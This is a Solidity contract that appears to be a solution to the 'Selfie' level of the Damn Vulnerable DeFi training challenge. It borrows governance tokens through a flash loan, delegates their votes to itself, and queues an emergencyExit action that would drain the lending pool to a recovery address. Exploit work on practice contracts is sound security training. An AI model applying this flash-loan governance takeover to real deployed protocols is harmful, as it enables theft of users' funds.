// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity = 0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";


contract SelfieReceiver is IERC3156FlashBorrower {

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;


    SelfiePool pool;
    SimpleGovernance governance;
    address recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, address _recovery) {
        pool = _pool;
        governance = _governance;
        recovery = _recovery;
    }


    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        bytes memory actionData = abi.encodeCall(SelfiePool.emergencyExit, (payable(recovery)));
        uint256 receiverBalance = IERC20(token).balanceOf(address(this));
        console.log('receiverBalance: ', receiverBalance);
        
        DamnValuableVotes(token).delegate(address(this));
        governance.queueAction(address(pool), 0, actionData);

        IERC20(token).approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

}